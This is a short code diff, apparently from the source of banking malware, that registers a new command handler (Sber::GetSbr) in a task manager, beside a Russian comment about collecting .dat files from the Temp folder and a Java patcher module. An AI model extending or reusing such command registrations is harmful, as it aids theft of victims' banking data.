@@ -877,6 +877,7 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 	// собираем данные *.dat %Temp%
 	#ifdef		SBERH
 		//RegisterCommand(Manager, (PCHAR)GetSberLog, ExecuteGrabSberLogCommand);
+		RegisterCommand(Manager, (PCHAR)Sber::GetSbr, Sber::ExecuteGetSbrCommand);
 	#endif
 
 	#ifdef		JAVS_PATCHERH
